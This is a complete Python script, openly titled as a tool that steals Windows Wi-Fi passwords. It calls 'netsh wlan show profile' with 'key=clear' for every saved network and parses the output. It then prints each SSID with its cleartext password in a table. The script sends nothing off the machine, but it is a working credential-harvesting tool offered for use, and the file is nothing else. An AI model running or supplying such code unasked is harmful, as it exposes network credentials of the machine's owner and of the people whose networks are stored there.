#!/usr/bin/env python3

"""Steals Windows WiFi Passwords

Usage: $ python3 stealwifipasswords.py
"""

import subprocess
import sys


def get_names(profile_info: str) -> list:
    """Parses command results to get WiFi SSIDs

    Args:
        profile_info (str): Result of Windows cmd

    Returns:
        list: List of SSIDs
    """
    names = []
    info = [x.strip() for x in profile_info.split("\n")]
    for line in info:
        if "All User Profile" in line:
            names.append(line.partition(":")[2].strip())
    return names


def get_passwords() -> list:
    """Executes Windows command to get WiFi information

    Returns:
        list: List of SSID and password pairs
    """
    cmd = ["netsh", "wlan", "show", "profile"]
    passwords = []
    try:
        profile_info = subprocess.check_output(cmd).decode()
        ssids = get_names(profile_info)
        for ssid in ssids:
            new_cmd = cmd + [ssid, "key=clear"]
            try:
                result = subprocess.check_output(new_cmd).decode()
                result = [x.strip() for x in result.split("\n")]
                for line in result:
                    if "Key Content" in line:
                        password = line.partition(":")[2].strip()
                        passwords.append([ssid, password])
            except:
                print(f"[-] Could not handle {ssid}...")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    return passwords


def print_passwords(password_list: list) -> None:
    """Prints SSID names with corresponding passwords

    Args:
        password_list (list): A list of SSID and password pairs
    """
    print("=" * 67)
    print("| {:^30} | {:^30} |".format(*("SSID", "Password")))
    print("=" * 67)
    for row in password_list:
        print("| {:<30} | {:>30} |".format(*row))
    print("=" * 67)


if __name__ == "__main__":
    if len(sys.argv) != 1:
        print(f"[!] Usage: python3 {sys.argv[0]}")
        sys.exit(1)
    password_list = get_passwords()
    print_passwords(password_list)
